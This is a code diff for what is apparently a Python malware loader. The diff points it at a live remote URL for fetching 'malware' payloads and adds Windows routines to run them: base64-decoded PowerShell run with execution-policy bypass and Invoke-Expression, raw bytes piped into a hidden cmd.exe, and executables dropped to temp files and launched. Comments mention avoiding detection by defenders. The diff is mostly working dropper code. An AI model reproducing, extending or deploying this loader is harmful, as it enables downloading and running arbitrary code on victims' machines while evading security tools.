@@ -24,7 +24,7 @@ elif OS == "Linux":
     LIN = True
 
 # The API url you used for fetch the json malware
-URL = ""
+URL = "https://api.npoint.io/6d59014bde401f7847fd"
 
 # The pip packages to install
 packages = ["requests"]
@@ -75,6 +75,7 @@ def execute_process(script_content: bytes, extension: str, malware: str) -> None
     :return:
     """
     # Check which extension the malware use
+
     if extension.lower() == "py":
         # Run a python script
         exec(script_content.decode("utf-8"))
@@ -101,9 +102,53 @@ def execute_process(script_content: bytes, extension: str, malware: str) -> None
             # If the system is Windows
             if extension.lower() == "ps1":
                 # Run a powershell script from the IEX
-                powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-Command',
-                                      f"$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{malware}')); Invoke-Expression $script"]
-                execution(powershell_command)
+                if script_content.startswith(b'[Byte[]]'):
+                    pass
+                    # powershell_command = [
+                    #     "powershell",
+                    #     "-ExecutionPolicy", "Bypass",
+                    #     "-EncodedCommand", malware
+                    # ]
+                    # execution(powershell_command, check=True)
+                else:
+                    powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-Command',
+                                          f"$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{malware}')); Invoke-Expression $script"]
+                    execution(powershell_command)
+            elif extension.lower() == "raw":
+                with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=f".ps1") as temp_script:
+                    print(type(script_content))
+                    temp_script.write(
+                        f"""$decodedExeBytes = [System.Convert]::FromBase64String("{malware}"); $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo; $processStartInfo.FileName = 'cmd.exe'; $processStartInfo.Arguments = '/c'; $processStartInfo.RedirectStandardInput = $true; $processStartInfo.UseShellExecute = $false; $processStartInfo.CreateNoWindow = $true; $process = [System.Diagnostics.Process]::Start($processStartInfo); $process.StandardInput.BaseStream.Write($decodedExeBytes, 0, $decodedExeBytes.Length); $process.StandardInput.Close(); $process.WaitForExit(); $process.Close(); $process.Dispose()""")
+                    temp_script_path = temp_script.name
+                with open(temp_script_path, "rb") as file:
+                    print(file.read())
+                normalized_path = os.path.normpath(temp_script_path)
+                powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-File', normalized_path]
+                execution(powershell_command, normalized_path)
+            elif extension.lower() == "exe":
+                # This option will alert the defense via the need of save
+                # In develop the in memory execution of exe file
+                temp_file_path = None
+                try:
+                    # Create a temporary file
+                    with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as temp_file:
+                        # Write the binary data to the temporary file
+                        temp_file.write(script_content)
+                    # Get the path to the temporary file
+                    temp_file_path = temp_file.name
+                    try:
+                        # Execute the temporary file
+                        subprocess.run([temp_file_path], shell=True, check=True)
+                        print("Binary executed successfully!")
+                    except subprocess.CalledProcessError as e:
+                        print(f"Error: Binary execution failed with return code {e.returncode}")
+                finally:
+                    # Clean up: delete the temporary file
+                    try:
+                        if temp_file_path is not None:
+                            os.remove(temp_file_path)
+                    except:
+                        pass
         elif LIN:
             # If the system is Linux
             if extension.lower() == "sh":
@@ -112,18 +157,26 @@ def execute_process(script_content: bytes, extension: str, malware: str) -> None
                 execution(final_command)
 
 
-def execution(command: str) -> None:
+def execution(command: str, normalized_path: str = None, check: bool = False) -> None:
     """
     Will execute the command using Shell
     :param command: The command to execute
+    :param normalized_path:
+    :param check:
     """
     try:
         if WIN:
-            subprocess.run(command, shell=False, check=True)
+            result = subprocess.run(command, shell=check, check=True)
+            print(result.stdout)
+            print(result.stderr)
         elif LIN:
             subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     except subprocess.CalledProcessError:
-        return
+        pass
+    finally:
+        if normalized_path is not None:
+            if os.path.exists(normalized_path):
+                os.remove(normalized_path)
 
 
 def main():
@@ -182,6 +235,7 @@ if __name__ == '__main__':
             print("Need administrator permissions")
             exit(1)
     import requests
+
     # Start the script
     main()
 
